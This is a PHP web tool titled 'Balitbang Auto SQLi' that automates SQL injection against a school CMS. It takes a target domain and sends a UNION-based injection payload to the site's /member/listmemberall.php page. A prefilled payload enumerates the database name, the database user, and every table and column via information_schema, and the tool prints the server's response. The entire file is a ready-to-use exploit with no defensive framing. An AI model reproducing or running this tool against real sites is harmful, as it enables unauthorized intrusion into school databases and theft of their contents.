<?php
echo "
<title>Balitbang Auto SQLi</title>
<style>
body {
    background-image:url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdR_zHn3u-C9KKtPRv4ifxjfP6lcqq7eoNqg&usqp=CAU);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}</style><center>
<pre><body bgcolor='white'><font color='black' size='4'>
<form action='' method='POST'>
Target : <input type='text' name='target' placeholder='target.sch.id'>
<textarea cols='50' rows='10' name='sqli'>concat(0x3c2f613e,database(),0x3c62723e,user(),(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)))</textarea>
Note : concat(0x3c2f613e,command);

<input type='submit' name='inject' value='Inject'>
</form></center><hr size='1'>";
if(isset($_POST['inject'])){
$target=$_POST['target'];
$sqli=$_POST['sqli'];
echo "<font size='3'>Url : http://$target<br>Command : $sqli<br><br> Output : ";
$ch = curl_init();curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);curl_setopt($ch, CURLOPT_URL, "http://$target/member/listmemberall.php");curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");curl_setopt($ch, CURLOPT_POST, 1);curl_setopt($ch, CURLOPT_POSTFIELDS, "queryString=hantu%'/**/union/**/select/**/$sqli,version()-- -");curl_setopt($ch, CURLOPT_TIMEOUT, 3);curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);curl_setopt($ch, CURLOPT_VERBOSE, true);$buf = curl_exec ($ch);curl_close($ch);
unset($ch);
sleep(1);
echo "$buf";
}
?>